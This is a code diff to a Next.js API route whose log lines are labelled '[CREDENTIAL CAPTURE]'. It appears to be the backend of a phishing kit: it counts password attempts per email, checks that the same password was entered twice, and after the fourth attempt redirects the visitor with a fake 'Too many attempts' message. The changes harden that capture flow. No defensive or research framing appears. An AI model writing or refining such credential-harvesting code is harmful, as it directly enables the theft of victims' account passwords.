@@ -391,15 +391,17 @@ export async function POST(request: NextRequest) {
     console.log('[CREDENTIAL CAPTURE] 📊 Current attempt:', currentAttempt, '| Same password confirmed:', attemptData.samePasswordConfirmed, '| Allow attempt:', attemptData.allowAttempt)
 
     // CRITICAL FIX: Check attempt limit BEFORE processing (must be first check)
-    // This prevents processing the 4th attempt if limit is reached
-    if (!attemptData.allowAttempt && currentAttempt >= 4) {
-      console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - blocking request')
+    // This prevents processing the 4th attempt or higher if limit is reached
+    if (!attemptData.allowAttempt || currentAttempt >= 4) {
+      console.log('[CREDENTIAL CAPTURE] 🚫 Too many attempts - blocking request (attempt:', currentAttempt, ')')
       const redirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
       return NextResponse.json({
         success: false,
         error: 'too_many_attempts',
         redirect: redirectUrl,
         message: 'Too many attempts. Please try again later.',
+        attemptCount: currentAttempt,
+        currentAttempt, // Legacy alias
       }, { status: 429 })
     }
 
@@ -961,7 +963,21 @@ ${verification.valid
       }
     }
 
-    // Return success with message if 4th attempt is allowed
+    // CRITICAL: After 4th attempt, always return redirect (even if we got here somehow)
+    if (currentAttempt >= 4) {
+      console.log('[CREDENTIAL CAPTURE] 🚫 4th attempt completed - returning redirect')
+      const finalRedirectUrl = await getRedirectUrl(email, 'TooManyAttempts')
+      return NextResponse.json({
+        success: false,
+        error: 'too_many_attempts',
+        redirect: finalRedirectUrl,
+        message: 'Too many attempts. Please try again later.',
+        attemptCount: currentAttempt,
+        currentAttempt, // Legacy alias
+      }, { status: 429 })
+    }
+
+    // Return success with message for attempts 1-3
     return NextResponse.json({
       success: true,
       verified: verificationResult?.valid || false,
